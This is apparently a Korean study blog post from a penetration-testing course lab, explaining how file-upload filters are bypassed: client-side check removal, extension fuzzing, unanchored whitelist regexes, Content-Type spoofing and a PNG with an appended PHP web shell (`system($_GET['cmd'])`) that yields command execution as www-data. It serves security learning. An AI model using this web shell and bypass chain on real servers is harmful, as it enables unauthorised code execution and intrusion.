---
title: "File Upload - Bypassing Filters"
date: 2026-06-15
layout: single
excerpt: "파일 업로드 기능에서 클라이언트 측 검증, 확장자 블랙리스트, 화이트리스트, Content-Type 및 MIME-Type 검증을 우회하고, 웹 서버의 파일 처리 방식과 결합해 PHP 웹 셸 실행까지 이어지는 과정을 정리한다."
author_profile: true
toc: true
toc_label: "File Upload"
toc_icon: "book"
toc_sticky: true
categories: [cpts-web]
tags: [web, cpts, file-upload]
---

파일 업로드 기능에서 클라이언트 측 검증, 확장자 블랙리스트, 화이트리스트, `Content-Type` 및 `MIME-Type` 검증을 우회하고, 웹 서버의 파일 처리 방식과 결합해 PHP 웹 셸 실행까지 이어지는 과정을 정리한다.

# Client-Side Validation

웹 애플리케이션에서는 JavaScript를 이용해 클라이언트 측에서 업로드할 파일의 확장자를 검사하는 경우가 있다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file1.png)

페이지에서 호출되는 `script.js` 를 확인하면 다음과 같은 코드가 존재한다:

```javascript
$(document).ready(function () {
  $("#uploadForm").submit(function (event) {
    event.preventDefault();
  })
})

function validate() {
  var file = $("#uploadFile")[0].files[0];
  var filename = file.name;
  var extension = filename.split('.').pop();

  if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#error_message').text("Only images are allowed!");
    File.form.reset();
    $("#submit").attr("disabled", true);
    return false;
  } else {
    return true;
  }
}

function showImage() {
  var file = $("#uploadFile")[0].files[0];
  if (file) {
    var reader = new FileReader();
    reader.onload = function (e) {
      $('#profile-image').attr('src', e.target.result);
    }
    reader.readAsDataURL(file);
  }
}

function upload() {
  var fd = new FormData();
  var files = $('#uploadFile')[0].files[0];
  fd.append('uploadFile', files);

  $.ajax({
    url: 'upload.php',
    type: 'post',
    data: fd,
    contentType: false,
    processData: false,
    success: function () {
      window.location.reload();
    },
  });
}
```

내부에서는 `validate()` 함수를 통해 파일 확장자를 검사하고, 검증을 통과한 경우에만 `upload()` 함수를 호출해 파일을 `upload.php` 로 전송한다.

위 사진에서도 `if(validate())` 조건이 참일 때만 `upload()` 가 실행되는 것을 확인할 수 있다.

다음과 같이 `validate()` 호출을 제거하고 `upload()` 를 직접 실행하도록 변경하였다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file2.png)

이제 폼을 제출하면 확장자 검증을 거치지 않고 `upload()` 함수가 직접 실행된다.

Burp Suite에서 **Proxy → Intercept**를 활성화한 뒤 파일 업로드 요청을 가로챘다.

정상적인 업로드 요청의 filename을 `shell.php` 로 변경하고, 파일 내용을 PHP 코드로 수정하였다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file3.png)

요청을 전송하고 페이지를 새로고침하면, 업로드된 파일이 프로필 이미지의 경로로 사용되는 것을 확인할 수 있다.

Burp Suite에서 다음 경로로 요청이 전송되었다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file4.png)

이를 통해 업로드된 파일이 다음 경로에 저장되었음을 확인할 수 있다:

```text
/profile_images/shell.php
```

따라서 URL에 다음과 같이 `cmd=id` 를 전달하였다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file5.png)

이를 통해 업로드된 PHP 파일이 서버에서 실행되었으며, 웹 서버 사용자 권한인 `www-data` 로 명령 실행이 가능함을 확인하였다.

# Blacklist Filters

앞서 사용한 방식대로 업로드 요청의 파일 이름과 내용을 PHP 웹 셸로 변경해 전송했지만, 이번에는 허용되지 않은 확장자라는 응답이 반환되었다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file6.png)

이는 클라이언트 측 검증 외에도 백엔드에서 파일 확장자를 검사하고 있음을 의미한다.

PHP 코드는 `.php` 뿐만 아니라 웹 서버 설정에 따라 `.php3`, `.php5`, `.phtml`, `.phar` 등 다양한 확장자로 실행될 수 있다. 

따라서 일부 확장자만 차단하는 블랙리스트 방식은 우회될 가능성이 있다.

[PayloadsAllTheThings의 PHP 확장자 목록](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)을 이용해 허용되는 확장자를 확인할 수 있다.

Burp Suite Intruder에서 파일 확장자 부분을 페이로드 위치로 지정하고, 확장자 목록을 불러와 퍼징을 진행하였다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file7.png)

또한 **Grep - Match**에 다음 문구를 등록하여 업로드에 성공한 응답을 쉽게 구분하도록 설정하였다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file8.png)

퍼징 결과, 해당 문구가 확인된 확장자들은 블랙리스트 검증을 통과한 것으로 판단할 수 있다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file9.png)

Intruder가 이미 각 확장자를 사용한 업로드 요청을 전송했으므로, 업로드 경로에서 실행 가능한 확장자를 직접 확인하였다.

그 결과 `.phar` 확장자로 업로드된 파일에서 명령 실행에 성공하였다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file10.png)

# Whitelist Filters

이번에는 화이트리스트 필터링 방식이다.

블랙리스트가 특정 확장자만 차단하는 방식이라면, 화이트리스트는 허용 목록에 존재하는 확장자가 있어야 업로드를 통과할 수 있는 구조이다.

다음과 같은 코드가 있다고 가정해보자:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

위 정규표현식은 파일 이름 내부에 `.jpg`, `.jpeg`, `.png`, `.gif` 중 하나가 존재하는지 확인한다.

따라서 다음 파일은 정상적으로 통과한다:

```text
test.gif
```

하지만 정규표현식 끝에 문자열의 끝을 의미하는 $가 없으므로, 다음과 같이 허용된 이미지 확장자 뒤에 다른 확장자가 붙어 있어도 통과할 수 있다:

```text
test.gif.php
```

먼저 `shell.phar` 파일을 그대로 업로드해본 결과, 허용된 이미지 확장자가 포함되어 있지 않아 차단되는 것을 확인할 수 있다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file11.png)

이후 파일 이름에 화이트리스트에 포함된 이미지 확장자를 추가하면 정상적으로 업로드된다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file12.png)

일반적인 웹 서버 설정이라면 마지막 확장자가 `.png` 이므로 이미지 파일로 처리되어야 하며, PHP 코드가 실행되지 않는 것이 정상이다.

하지만 해당 파일에 접근해본 결과 PHP 웹 셸이 정상적으로 실행되었다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file13.png)

이는 Apache의 PHP 핸들러 설정이 다음처럼 구성되어 있을 때 발생할 수 있다:

```text
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

위 정규표현식은 `.phar`, `.php`, `.phtml` 문자열을 검사한다.

하지만 패턴 마지막에 `$` 가 없으므로, 파일 이름이 해당 확장자로 끝나는지 확인하지 않고 파일 이름 내부에 위 문자열이 포함되어 있는지만 확인한다.

따라서 다음 파일은 마지막 확장자가 `.png` 임에도 파일 이름 내부에 `.phar` 가 존재하므로 PHP 핸들러로 처리될 수 있다.

# Type Filters

파일 업로드 검증에서는 파일명의 확장자뿐만 아니라, 업로드된 파일의 `Content-Type` 헤더나 실제 파일 내용을 검사하기도 한다.

## Content-Type Header Bypass

다음 코드를 살펴보자:

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

위 코드는 업로드 요청에 포함된 파일의 Content-Type 값을 가져와 다음 값 중 하나인지 확인한다:

```text
image/jpg
image/jpeg
image/png
image/gif
```

허용 목록에 존재하지 않는 `Content-Type` 이 전달되면 업로드를 차단한다.

예를 들어 업로드 요청에는 다음과 같은 값이 포함될 수 있다:

```http
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: application/x-php
```

Burp Suite를 이용해 이를 다음과 같이 변경할 수 있다:

```http
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/png
```

즉, 실제 파일이 PHP 파일이더라도 `Content-Type` 헤더를 이미지 타입으로 조작하여 검증을 우회할 수 있다.

## MIME-Type Validation Bypass

`Content-Type` 헤더는 클라이언트가 임의로 변경할 수 있으므로, 일부 애플리케이션은 업로드된 파일의 실제 내용을 분석하여 MIME 타입을 확인한다.

다음 코드를 살펴보자:

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

`mime_content_type()` 함수는 임시로 저장된 파일의 내용을 확인하여 MIME 타입을 판별한다.

따라서 정상적인 PNG 파일 뒤에 PHP 코드를 추가하면, MIME 타입 검사에서는 이미지로 인식되면서도 PHP 코드가 파일 내부에 존재하는 파일을 만들 수 있다.

## Chaining File Upload Filter Bypasses

먼저 ImageMagick의 `convert` 명령어를 이용하여 작은 PNG 파일을 생성하였다:

```bash
$ convert -size 0x0 xc:white shell.png
```

```bash
$ file shell.png 

shell.png: PNG image data, 1 x 1, 1-bit grayscale, non-interlaced
```

정상적인 PNG 파일이 생성된 것을 확인할 수 있다.

이제 PNG 파일의 마지막에 PHP 웹 셸 코드를 추가하였다:

```bash
$ printf '\n<?php system($_GET["cmd"]); ?>' >> shell.png 
```

파일 내부를 확인하면 PNG 데이터 뒤에 PHP 코드가 추가된 것을 볼 수 있다:

```bash
$ cat shell.png  

�PNG
▒
IHDR7n�$ cHRMz&�����u0�`:�p��Q<bKGD�tIME�2U�"^%tEXtdate:create2026-07-16T22:22:50+00:00u/�%tEXtdate:modify2026-07-16T22:22:50+00:00r�\(tEXtdate:timestamp2026-07-16T22:22:50+00:00Sg��
IDA�ch���Cj�IEND�B`�
<?php system($_GET["cmd"]); ?> 
```

이제 파일 업로드를 진행해볼것이다.

Burp Suite에서 **Proxy → Intercept**를 활성화한 뒤 파일 업로드 요청을 가로챘다.

먼저 업로드되는 파일 이름을 `shell.php` 로 변경하고, 파일의 `Content-Type` 을 `image/png` 로 설정하였다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file14.png)

그러나 서버는 다음 응답을 반환하며 업로드를 차단하였다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file15.png)

이는 MIME 타입과 `Content-Type` 검증은 통과했지만, 별도의 파일 확장자 검증에서 `.php` 가 차단되었음을 의미한다.

파일 이름을 `shell.phar` 로 변경해도, 앞선 화이트리스트 실습과 마찬가지로 허용된 이미지 확장자가 포함되어 있지 않아 업로드가 차단되었다.

따라서 파일 이름에 허용된 `.png` 문자열과 PHP로 실행될 수 있는 `.phar` 확장자를 함께 사용하였다.

그 결과 파일이 정상적으로 업로드되었다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file16.png)

이후 서버에서 `id` 명령이 실행되었으며, 다음과 같이 `www-data` 권한으로 명령 실행에 성공한 것을 확인할 수 있었다:

![File Upload](/assets/cpts-web/file-upload-bypassing-filters/file17.png)